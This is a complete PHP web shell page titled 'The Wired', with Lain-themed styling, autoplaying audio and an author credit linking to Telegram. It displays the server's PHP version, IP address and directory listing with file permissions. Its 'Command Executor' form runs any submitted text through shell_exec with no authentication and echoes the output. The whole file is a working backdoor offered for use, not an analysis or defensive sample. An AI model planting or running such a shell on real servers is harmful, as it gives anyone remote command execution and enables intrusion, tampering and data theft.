<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js" integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI" crossorigin="anonymous"></script>
    <link rel="shortcut icon" href="https://fauux.neocities.org/lain_wired.gif" type="image/gif">
    <title>The Wired</title>
</head>
<body style="background-color: black;">
    <div>
        <img src="https://fauux.neocities.org/loveLain.gif" class="rounded mx-auto d-block w-25" alt="logo" style="margin-top: 10px;">
    </div>
    <div>
        <p class="text-center text-light" style="font-family: 'Courier New', monospace; color: #c1b492; text-shadow: 0 0 5px #c1b492;">PHP INFO: <?php echo phpversion(); ?> | IP: <?php echo $_SERVER['SERVER_ADDR']; ?></p>
    </div>
    <div class="container mt-4">
        <h2 class="text-light" style="font-family: 'Courier New', monospace; color: #c1b492;">File Listing</h2>
        <div class="table-responsive">
            <table class="table table-dark table-striped" style="border: 1px solid #c1b492; background-color: #000000; color: #c1b492; font-family: 'Courier New', monospace;">
                <thead style="background-color: #111111;">
                    <tr>
                        <th style="border-bottom: 1px solid #c1b492;">Name</th>
                        <th style="border-bottom: 1px solid #c1b492;">Size</th>
                        <th style="border-bottom: 1px solid #c1b492;">Type</th>
                        <th style="border-bottom: 1px solid #c1b492;">Permissions</th>
                        <th style="border-bottom: 1px solid #c1b492;">Modified</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $dir = '.';
                    $files = scandir($dir);
                    foreach ($files as $file) {
                        if ($file !== '.' && $file !== '..') {
                            $path = $dir . '/' . $file;
                            $size = is_dir($path) ? '-' : filesize($path) . ' B';
                            $type = is_dir($path) ? 'Directory' : 'File';
                            $perms = substr(sprintf('%o', fileperms($path)), -4);
                            $mod = date('Y-m-d H:i', filemtime($path));
                            $link = is_dir($path) ? $file . '/' : $file;
                            echo "<tr style='border-bottom: 1px solid #333;'>
                                    <td><a href=\"$link\" class=\"text-light\" style=\"color: #c1b492; text-decoration: none; text-shadow: 0 0 5px #c1b492;\">$file</a></td>
                                    <td>$size</td>
                                    <td>$type</td>
                                    <td>$perms</td>
                                    <td>$mod</td>
                                  </tr>";
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
        
        <h2 class="text-light mt-5" style="font-family: 'Courier New', monospace; color: #c1b492;">Command Executor</h2>
        <form method="post" class="mb-4">
            <div class="mb-3">
                <textarea name="command" class="form-control" rows="3" placeholder="Enter command to execute..." style="background-color: #000000; color: #c1b492; border: 1px solid #c1b492; font-family: 'Courier New', monospace;"></textarea>
            </div>
            <button type="submit" class="btn btn-outline-light" style="border-color: #c1b492; color: #c1b492;">Execute</button>
        </form>
        
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
            $command = $_POST['command'];
            echo '<div class="alert alert-dark" style="background-color: #111111; border: 1px solid #c1b492; color: #c1b492; font-family: \'Courier New\', monospace;">';
            echo '<h5>Command Output:</h5>';
            echo '<pre>';
            $output = shell_exec($command);
            echo htmlspecialchars($output);
            echo '</pre>';
            echo '</div>';
        }
        ?>
    </div>

    <div class="d-flex align-items-center justify-content-center gap-3 mt-5 p-3" style="background-color: rgba(17, 17, 17, 0.8); border: 1px solid #c1b492; border-radius: 10px; box-shadow: 0 0 15px rgba(193, 180, 146, 0.5);">
        <div class="text-center">
            <p class="mb-1 text-light" style="color: #c1b492; font-family: 'Courier New', monospace; text-shadow: 0 0 5px #c1b492;">Author: <a href="https://t.me/hornykernel" class="text-decoration-none" style="color: #c1b492; text-decoration: none;">Lain</a></p>
            <p class="mb-0 text-light" style="color: #c1b492; font-family: 'Courier New', monospace; text-shadow: 0 0 5px #c1b492;">channel: <a href="https://t.me/TheWiredOfficial" class="text-decoration-none" style="color: #c1b492; text-decoration: none;">The Wired</a></p>
        </div>
        <img src="https://fauux.neocities.org/lainsmall2.gif" class="img-thumbnail rounded" alt="credits" style="max-width: 300px; border: 1px solid #c1b492; box-shadow: 0 0 10px #c1b492; mix-blend-mode: screen; background-color: black;">
    </div>
    

    <audio autoplay="on" loop="on" data-vc-hooked="true">
        <source src="https://fauux.neocities.org/sound/boon_loop.wav" type="audio/wav">
    </audio>
        <audio autoplay="on" loop="on" data-vc-hooked="true">
        <source src="https://fauux.neocities.org/sound/psx_lain.wav" type="audio/wav">
    </audio>
        <audio autoplay="on" data-vc-hooked="true">
        <source src="https://fauux.neocities.org/sound/WiredIntro2.wav" type="audio/wav">
    </audio>
</body>
</html>